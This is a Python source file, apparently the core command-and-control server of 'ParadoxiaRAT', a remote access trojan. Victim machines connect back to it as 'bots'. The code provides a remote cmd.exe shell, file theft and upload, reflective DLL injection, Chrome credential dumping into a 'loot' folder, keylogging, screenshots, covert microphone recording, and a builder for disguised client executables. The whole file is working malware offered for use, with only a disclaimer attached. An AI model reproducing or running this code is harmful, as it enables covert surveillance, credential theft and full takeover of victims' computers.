"""
Core file for Paradoxia V.2
Most of the code has been taken from the Maalik Framework and merged into old and bad code of paradoxia.

=> https://github.com/quantumcored/maalik
"""

"""

Have a good time reading the source. You are an amazing person.

"""
import socket
import _thread
import configparser
from os import stat
from os import path
from .builder import Build
import os
import subprocess
from kernel.banner import pbanner
from .other import *
from colorama import Fore, Style
import colorama 
from .scanner import *
import tqdm
import time
from prompt_toolkit import prompt
import sys

colorama.init()

clients = [] # List of client sockets
oslist = [] # List of client Operating systems
iplist = [] # List of Client IP addresses
wan_ip_list = [] # List of Client Wan IP's
blacklist = [] # List of blacklisted ip
log = [] # logging messages from client
hostList = []

ClientInfoList = []

isSession = False
silent = False
shellmode = False  # ( ͡° ͜ʖ ͡°)

# Do not change this
DLL_OUTPUT_FILE = "proxima_centauri.txt"

infodb = configparser.ConfigParser()
settings = configparser.ConfigParser()


try:
    settings.read("paradoxia.ini")
    server_settings = settings['server']
    bot_settings = settings['bot']
except Exception as e:
    print(str(e))
    exit(True)


def broadcast(data):
    try:
        for i in clients:
            i.send(data.encode())
    except Exception as error:
        print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(error))


class ParadoxiaClient:
    def __init__(self, client_socket):
        self.client_socket = client_socket

    global clients
    global oslist
    global iplist
    global wan_ip_list
    global blacklist

    client_information = []

    def Log(self, data):
        del log[:]
        log.append(data)


    def botlist(self):
        return str(len(clients))

    def SendData(self, data):
        try:
            self.client_socket.send(data.encode())
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))

    def SendBytes(self, data):
        try:
            self.client_socket.send(data)
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))


    def returnClientName(self):
        index = clients.index(self.client_socket)
        return wan_ip_list[index] + " - " + oslist[index]

    def _clearKick(self):
        '''
        clear lists and kick
        '''
        global isSession
        global clients
        try:
            if(isSession):
                print( Style.BRIGHT + Fore.RED + "[ Session Closed ] " + Style.RESET_ALL + self.returnClientName())
                isSession = False
            location = clients.index(self.client_socket)
            clients.remove(clients[location])
            iplist.remove(iplist[location])
            oslist.remove(oslist[location])
            wan_ip_list.remove(wan_ip_list[location])
            ClientInfoList.remove(ClientInfoList[location])
        except Exception as unkown_error:
            print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Error : " + str(unkown_error))

    def clearLog(self):
        del log[:]

    def WaitForReply(self):
        """
        Wait 20 seconds for Message from Client
        """
        self.clearLog() # Clear log list
        x = 0 # x is 0
        while(x != 20): # while x is not 20
            try: 
                if(len(log) > 0): # If length of log is greater than 0, means message received. So break the loop
                    break # break here
                time.sleep(0.5) # Sleep 0.5 second
                x += 1 # Add one to x
                if(x == 20):
                    print( Style.BRIGHT + Fore.RED + "[i]" + Style.RESET_ALL + " 20 seconds have passed and we have received no response from Paradoxia. There may be a problem.")
            except KeyboardInterrupt:
                break # Keyboard interrupt, Breaks the loop.

    
    def returnWanIP(self):
        ip_index = clients.index(self.client_socket)
        wanip = wan_ip_list[ip_index]
        
        if(wanip.startswith("No")):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Unable to get Wan IP, No internet access detected.")
            geolocation_information = "[No Internet Access]"
        else:
            return wan_ip_list[ip_index]

    def returnOS(self):
        ip_index = clients.index(self.client_socket)
        return oslist[ip_index]

    def getClientInformation(self):
        wanip = self.returnWanIP()
        os = self.returnOS()
        # print(os)
        self.SendData("ramsize")
        ram = self.client_socket.recv(1024).decode()
        # print(ram)
        self.SendData("vramsize")
        vram = self.client_socket.recv(1024).decode()
        # print(vram)
        self.SendData("pagesize")
        pagesize = self.client_socket.recv(1024).decode()
        # print(pagesize)
        self.SendData("processors")
        processors = self.client_socket.recv(1024).decode()
        # print(processors)
        self.SendData("minappaddr")
        minappaddr = self.client_socket.recv(1024).decode()
        # print(minappaddr)
        self.SendData("maxappaddr")
        maxappaddr = self.client_socket.recv(1024).decode()
        # print(maxappaddr)
        self.SendData("agent")
        agent_location = self.client_socket.recv(1024).decode()
        # print(agent_location)
        self.SendData("host")
        user_pc = self.client_socket.recv(1024).decode()
        # print(user_pc)


        return """
        [+] Operating System : {os}
        [+] Ram : {ram}
        [+] VirtualRam : {vram}
        [+] MinimumApplicationAddress : {minappaddr}
        [+] MaximumApplicationAddress : {maxappaddr}
        [+] PageSize : {pagesize}
        [+] Processors : {processors}
        [+] Agent-Location : {agent_location}
        [+] User-PC : {userpc}
        [+] WAN : {wanip}
        """.format(
            os = os,
            ram = ram,
            vram = vram,
            minappaddr = minappaddr,
            maxappaddr = maxappaddr,
            pagesize = pagesize,
            processors = processors,
            agent_location = agent_location,
            userpc = user_pc,
            wanip = wanip,
        )



    def Session(self):

        global isSession
        global shellmode
        global silent

        def filetransfer(mfile = None, rfile=None):
            if(mfile == None and rfile == None):
                mfile = prompt("[+] File Path : ")
                rfile = prompt("[+] File name to Save as : ")
                
            if(":" in rfile):
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
            else:
                try:
                    with open(mfile, "rb") as sendfile:
                        data = sendfile.read()
                        bufferst = os.stat(mfile)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                        
                        self.SendData("frecv") # Send File Receive trigger for client
                        trigger = rfile + ":" + str(bufferst.st_size) 
                        time.sleep(1)
                        self.SendData(trigger) # Send Trigger
                        self.SendBytes(data) # Send file
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                        self.WaitForReply()
                except FileNotFoundError:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
                except Exception as e:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
        
        def DLLTransfer(mfile=None):
            if(mfile == None):
                mfile = prompt("[+] DLL Path : ")
                proc = prompt("[+] Process Name : ")
            else:
                proc = "None"
            try:
                with open(mfile, "rb") as sendfile:
                    data = sendfile.read()
                    bufferst = os.stat(mfile)
                    #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                    
                    self.SendData("fdll") # Send File Receive trigger for client
                    time.sleep(1)
                    trigger =  "paradoxia" + ":" + str(bufferst.st_size) + ":" + proc
                    self.SendData(trigger) # Send Trigger
                    self.SendBytes(data) # Send file
                    #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                    self.WaitForReply()
            except FileNotFoundError:
                print("[X] '{file}' not found!?".format(file = mfile))
            except Exception as e:
                print("[X] Error : " + str(e))

        isSession = True
        while(isSession):
            try:
                try:
                    location = clients.index(self.client_socket)
                    if not shellmode:
                        shellmode = True

                except ValueError:
                    print("[X] Client disconnected unexpectedly, Session closed.")
                    shellmode = False
                    session = False
                    break
                ip = iplist[location]
                main = prompt("paradoxia >> ({ip}) : ".format(ip = ip))
                if(main == "ls"):
                    
                    self.SendData("listdir")
                    self.WaitForReply()
                    
            
                elif(main.startswith("dir")):
                    sp = main.split()
                    try:
                        self.SendData("cd")
                        self.SendData(sp[1])
                        self.WaitForReply()
                    except IndexError:
                        print(Style.BRIGHT + Fore.RED + "[X] Error : Usage is dir < dir > ")
                elif(main == "poweroff"):
                    self.SendData("cmd.exe /c shutdown /s /t 0")
                    self.WaitForReply()
                elif(main == "reboot"):
                    self.SendData("cmd.exe /c shutdown /r /t 0")
                    self.WaitForReply()
                elif(main == "shell"):
                    shell = True
                    
                    while (shell):
                        sh = prompt("cmd> ")
                        if(len(sh) > 0):
                            if(sh != "exit"):
                                self.SendData("cmd.exe /c "+ sh)
                                self.WaitForReply()
                            else:
                                shell = False
                                break
                            
                elif(main == "exit"):
                    shellmode = False
                    session = False
                    break

                elif(main == "delete"):
                    dlt = prompt("[:] Enter Filename to Delete : ")
                    if(len(dlt) > 0):
                        self.SendData("delete:"+dlt)
                        self.WaitForReply()

                elif ( main == "clientinfo"):
                    self.SendData("clientinfo")
            
                elif(main == "upload"):
                    filetransfer()
                    time.sleep(2)

                elif(main == "download"):
                    filename = prompt("[+] File : ")
                    if(len(filename) > 0):
                        self.SendData("fupload:"+filename)
                        self.WaitForReply()
                        time.sleep(5)

                elif(main == "processinfo"):
                    name = prompt("[+] Enter Process name : ")
                    if(len(name) > 0):
                        self.SendData("psinfo:"+name)
                        self.WaitForReply()

                elif(main == "admin"):
                    self.SendData("isadmin")
                    self.WaitForReply()

                elif(main == "geolocate"):
                    GeoLocate(self.returnWanIP())
                elif(main == "dllinject"):
                    DLLTransfer()
                
                elif(main == "drives"):
                    self.SendData("cmd.exe /c fsutil fsinfo drives")
                    self.WaitForReply()
                    
                elif(main == "help"):
                    print(session_help)

                elif (main == "kill"):
                    self.SendData("kill")
                    self.client_socket.shutdown(socket.SHUT_RDWR)
                    self.client_socket.close()
                    shellmode = False
                    session = False
                    break

                elif(main == "die"):
                    self.SendData("die")
                    self.WaitForReply()
                    self.client_socket.shutdown(socket.SHUT_RDWR)
                    self.client_socket.close()
                    shellmode = False
                    session = False
                    break
                elif(main == "screenshot"):
                    self.SendData("screenshot")
                    self.WaitForReply()

                elif(main == "chromedump"):
                    DLLTransfer("dlls/chrome.dll") # Inject ChromeDump.dll
                    time.sleep(2)
                    credfile = hostList[location].split("/")[0].strip()
                    self.SendData("fupload:"+credfile)
                    time.sleep(2)
                    self.SendData("delete:"+credfile)
                    self.WaitForReply()
                    print("-------------------------")
                    PrintTextFile("loot/"+credfile)
                    print("-------------------------")
                    print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")

                elif(main == "keylog_start"):
                    DLLTransfer("dlls/keylogger.dll")
                
                elif(main == "keylog_dump"):
                    self.SendData("fupload:log.log")
                    self.WaitForReply()
                    time.sleep(2)
                    self.SendData("delete:log.log")
                    self.WaitForReply()
                    print("-------------------------")
                    PrintTextFile("loot/log.log")
                    print("-------------------------")
                    try:
                        os.remove("loot/log.log")
                    except FileNotFoundError:
                        print("[X] No Logs were written.")

                elif(main == "info"):
                    index = clients.index(self.client_socket)
                    print(ClientInfoList[index])

                elif(main == "micrecord"):
                    saveFile = input("[+] Enter filename to save as : ")
                    if(len(saveFile) > 0):
                        self.SendData("micstart")
                        self.WaitForReply()
                        while(True):
                            try:
                                print("[+] Press CTRL+C to stop.")
                                prompt("")
                            except KeyboardInterrupt:
                                    self.SendData("micstop:"+saveFile)
                                    break
                        time.sleep(2)
                        self.SendData("fupload:"+saveFile)
                        self.WaitForReply()
                        time.sleep(2)
                        self.SendData("delete:"+saveFile)

            except KeyboardInterrupt:
                print("[X] Interrupt, Type exit to Exit session.")

    
    def ClientThread(self):
        
        """
        Receive data from client
        """
        global silent
        global shellmode

        def uniquify(path):
            """
            Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
            """
            filename, extension = os.path.splitext(path)
            counter = 1

            while os.path.exists(path):
                path = filename + " (" + str(counter) + ")" + extension
                counter += 1

            return path

        while(True):
            try:
                client_data = self.client_socket.recv(1024).decode()
                
                if(not client_data):
                    self._clearKick()
                    break 

                self.Log(client_data)

                try:
                    indexof = clients.index(self.client_socket)
                    ips = iplist[indexof]
                except Exception as e:
                    print("[X] Error : " + str(e))
                    pass
                
                # Paradoxia reporting an Open Port on a Host
                if(client_data.startswith("OPENPORT")):
                    # OPENPORT:IP,Port
                    parse = client_data.split(":")
                    ip_port = str(parse[1]).split(",")
                    with open("common_ports", "r") as portlist:
                        lines = portlist.readlines()
                        for line in lines:
                            if(ip_port[1] in line):
                                # if port in list
                                ipport = ip_port[0] + ":" + ip_port[1]
                                print("["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + ipport + Style.BRIGHT + Fore.GREEN + " <--> " + Style.RESET_ALL + line )
                                if(ipport not in self.open_ports_list):
                                    self.open_ports_list.append(ipport)
                                break
                      

                # Paradoxia wants to send us a file
                elif(client_data.startswith("FILE")):
                    try:
                        fileinfo = client_data.split(":") #FILE:filename.txt:555
                        #print(fileinfo)
                        filename = fileinfo[1]
                        filesize = int(fileinfo[2])
                        SaveFile = "loot/"+ filename
                        FinalF = uniquify(SaveFile)

                        with open(FinalF, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                           
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                            while(len(data) != filesize):
                                data += self.client_socket.recv(filesize - len(data))  
                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data: break
                            incoming_file.write(data)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=FinalF))

                    except Exception as e:
                        print("[X] Error : " + str(e))
                        print("[i] File Download Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # Get Process information
                elif(client_data.startswith("PROCESS")):
                    try:
                        fileinfo = client_data.split(",") # split info by comma
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Process '{p}' running at PID '{pid}' Path on disk '{pth}' ..."
                            .format(p = fileinfo[1], pid = fileinfo[2], pth = fileinfo[3]))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                elif(client_data.startswith("PID")):
                    try:
                        fileinfo = client_data.split(":") # split info by comma
                        self.SendData("psinfo:"+fileinfo[1])

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(client_data.startswith("ADMIN")):
                    try:
                        fileinfo = client_data.split(":") 
                        
                        if(fileinfo[1] == "TRUE"):
                            elevated = True
                        else:
                            elevated = False
                            
                        if(not silent):
                            print(
                                Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1].lower())
                        
                        
                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                    
                 # Get screenshot, Convert to png and save
                elif(client_data.startswith("SCREENSHOT")):
                    try:
                        fileinfo = client_data.split(":") #SCREENSHOT:filename.txt:555
                        # print(fileinfo)
                        filename = fileinfo[1]
                        filesize = int(fileinfo[2])
                        SaveFile = "loot/"+ filename
                        FinalF = uniquify(SaveFile).replace("bmp", "png")

                        time.sleep(1)
                        with open(FinalF, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                            #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                            while(len(data) != filesize):
                                data += self.client_socket.recv(filesize - len(data))  
                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data: break
                            incoming_file.write(data)
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Screenshot saved to '{fl}'".format(fl=FinalF))
                            saveAndShowImage(FinalF) 
                                  
                    except Exception as e:
                        print("[X] Error : " + str(e))
                        print("[i] Screenshot Download Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # File was recevied by Paradoxia
                elif(client_data.startswith("F_OK")):
                    try:
                        fileinfo = client_data.split(",") # split info by comma
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
                            .format(filename = fileinfo[1], filesize = fileinfo[2], remote_path = fileinfo[3]))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Received Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass

                # Reflective DLL Injection was successfully done    
                elif(client_data.startswith("DLL_OK")):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Injected Reflective DLL into PID " + fileinfo[1] + " ...")

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Reflective DLL Inject Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # Get Wanip, geolocate

                elif(client_data.startswith("WANIP")):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] WAN IP : " + fileinfo[1] + " ...")
                        GeoLocate(fileinfo[1])
                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Geolocation Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(client_data.startswith("DEL_OK")):
                    try:
                        fileinfo = client_data.split(",")
                        print( "[" + Fore.LIGHTGREEN_EX + Style.BRIGHT + "i" + Style.RESET_ALL + "] File '{file}' deleted from '{pth}' ..." .format(file = fileinfo[1], pth = fileinfo[2] ))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Delete Information : " + client_data)
                        # Rare case, This will only happen if Paradoxia has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(shellmode == True):
                    print("\n"+client_data) # No other information

                elif(silent == False):
                    print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
                    
            except Exception as e:
                self._clearKick()
                print("[X] Error : " + str(e))
                break
            except UnicodeDecodeError as ude:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
            except UnicodeEncodeError as eEe:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))
            except ConnectionAbortedError as cAe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cAe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionError as cE:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cE))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionRefusedError as cRe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionResetError as cRetwo:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRetwo))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except socket.error as se:
                   
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(se))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            
            except Exception as recv_error:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(recv_error))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

def TCPServer():
    global iplist
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    host = server_settings['host']
    port = int(server_settings['port'])

    blist = open("blacklist", "r")
    bl_ips = blist.readlines()
    for i in range(len(bl_ips)):
        if("#" in bl_ips[i]):
            pass
        else:
            blacklist.append(bl_ips[i])

    try:
        server.bind((host, port))
    except PermissionError:
        print("["+Style.BRIGHT + Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Run as sudo.")
        exit(True)
    except Exception as i:
        raise i

    try:
        server.listen(5)
        #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] TCP Server running. ({host}:{port})".format(host=host, port=server_settings['port']))
    except KeyboardInterrupt:
        print(" Keyboard Interrupt, Exit.")
        exit()
    except Exception as errunknown:
        print(str(errunknown))

    while(True):
            
        client, addr = server.accept()
        if(addr[0] in blacklist):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] New Connection form blacklisted IP " + str(addr[0]) +":"+ str(addr[1]))
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Connection Closed.")
            client.shutdown(socket.SHUT_RDWR)
            client.close()
            break
        

        try:
            client.send("host".encode())
            host = client.recv(1024).decode() # Receive User PC ' Test / TEST-PC '. I call this host. And all of these are saved in hostList
            hostList.append(host)
        except Exception as e:
            print(str(e))
            break
        
        wanip = ""
        try:
            cld = ParadoxiaClient(client)
            clients.append(client)
            client_ip = str(addr[0]) +":"+ str(addr[1])
            iplist.append(client_ip)
            client.send("wanip".encode())
            wanip = client.recv(1024).decode()
            
            if(wanip.startswith("No")):
                wan_ip_list.append(wanip)
            else:
                wan_ip_list.append(wanip.split(":")[1])

            client.send("os".encode())
            os = client.recv(1024).decode()
            
            oslist.append(os)

            full_info = cld.getClientInformation()
            ClientInfoList.append(full_info)
        except ConnectionResetError as cRe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cRe) + ".")
            clients.remove(client)
            iplist.remove(str(addr[0]))
            oslist.remove(os)
        except ConnectionAbortedError as cAe:
            print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ERROR : " + str(cAe) + ".")
            clients.remove(client)
            iplist.remove(str(addr[0]))
            oslist.remove(os)
            
        except Exception as e:
            print("[X] Error : " + str(e))
            
        if(wanip.startswith(("No"))):
            filename = "bots/"+str(addr[0])
        else:
            filename = "bots/"+str(wanip)
        if(bot_settings['verbose'] == "True"):
            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Getting information..") 
        notify("Paradoxia", "New Connection : " + cld.returnClientName())
        # default
        print( Style.BRIGHT + Fore.GREEN + "\n[ Session Opened ] " + Style.RESET_ALL + cld.returnClientName())
        _thread.start_new_thread(cld.ClientThread, ())



def Console():
    global iplist
    def SendData(csocket, data):
        csocket = int(csocket)
        sockfd = clients[csocket]
        
        try:
            sockfd.send(data.encode())
        except Exception as error:
            clients.remove(sockfd)
            print("Error Occured : " + str(error))

    def list_bots():
        print("\nActive Sessions (" + str(len(clients)) +")")
        print("===================================")
        try:
            if(len(clients) > 0): 
                for i in range(len(iplist)):
                    print(  
                        "\n[ Session ID : "+str(i) +" ][ Connection : "+iplist[i] + " ][ WAN : "+wan_ip_list[i] +" ][ Operating System : " + oslist[i] + " ]"
                        )
        except Exception as stre:
            print("Error : " + str(stre))

    _thread.start_new_thread(TCPServer, ()) 
    global silent
    while(True):
        try:
            if(silent == False):
                promptstr = "paradoxia >> "
                x = prompt(promptstr)
                args = x.split()
                if(x == "list" or x == "sessions"):
                    list_bots()
                elif(x.startswith("session")):
                    try:
                        cid = args[1]
                        sock = clients[int(cid)]
                        sess = ParadoxiaClient(sock)
                        sess.Session()
                    except IndexError:
                        print("USAGE : session < client id >")
          
                elif(x == "exit"):
                    if(len(clients) > 0):
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] You have online bots? Kill the connections?")
                        yn = prompt("[+] Your Desicion (y/N) : ").lower()
                        if(yn == "y"):
                            broadcast("kill")
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Disconnected everyone.")
                            exit(True)
                        else:
                            pass
                    else:
                        exit(True)
                elif(x == "help"):
                    print(Style.BRIGHT + Fore.GREEN + 
                        """
                        ParadoxiaRAT
                        ---------------
                        -> Commands : 
                        -. help - Print this help message.
                        -. sessions - View online clients.
                        -. session - interact with a session.
                        -. build - Build Client.
                        -. clientinfo < cid > - View session information.
                        -. kill - Kill session.
                        -. exit - Exit.
                        Use the help command inside a session to view Session specific help.
                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
                        Created by : QuantumCore (Fahad) 
                        Website : https://quantumcored.com
                        Email : quantumcore@protonmail.com
                        Discord : https://discordapp.com/invite/8snh7nx
                        Github Repository : https://github.com/quantumcored/paradoxia
                        If you find any bugs, Please Report them here : https://github.com/quantumcored/paradoxia/issues
                        ~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=
                        The Developer is not responsible for any misuse of Damage caused by the program. This is created only to innovate Information Security and YOU.
                        """
                        + Style.RESET_ALL)
                elif(x == "build"):
                    host = prompt("[+] Host : ")
                    port = prompt("[+] Port : ")
                    name = prompt("[+] Installation Name (.exe) : ")
                    installdir = prompt("[+] Installation Folder name : ")
                    
                    output = prompt("[+] Output file name (.exe) : ")
                    askicon = prompt("[?] Would you like to build with Icon? (Y/n) : ")
                    askicon = askicon.lower()
                    if(askicon== "y"):
                        icon_path = prompt("[+] Icon Path (.ico) : ")
                        if(len(icon_path) > 0):
                            if(len(host) > 0 and len(port) > 0 and len(output) > 0 and len(name) > 0 and len(installdir) > 0):
                                Build(host, port, icon_path,output, name, installdir)
                        else:
                            print("[+] NO icon path specified.")
                    else:
                        if(len(host) > 0 and len(port) > 0 and len(output) > 0 and len(name) > 0 and len(installdir) > 0):
                            Build(host, port, None ,output, name, installdir)
                        else:
                            print("[+] One or more values not entered correctly.")
                elif(x.startswith("kill")):
                    try:
                        cid = int(args[1])
                        SendData(cid, "kill")
                        clients[cid].shutdown(socket.SHUT_RDWR)
                        clients[cid].close()
                        
                    except IndexError:
                        print("USAGE : kill <session id>")

                elif(x.startswith("clientinfo")):
                    try:
                        x = int(args[1])
                        print(ClientInfoList[x])            
                    except IndexError:  
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] USAGE : clientinfo < cid >")
            
                    except Exception as UnknownException:
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(UnknownException))


                else:
                    if(len(x) > 0):
                        try:
                            print(Style.BRIGHT + Fore.LIGHTCYAN_EX )
                            subprocess.run(['bash', '-c', x])
                            print(Style.RESET_ALL)
                        except Exception as procError:
                            print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Error : " + str(procError))
        except KeyboardInterrupt:
            print("[X] Interrupt, Type exit to Exit.")
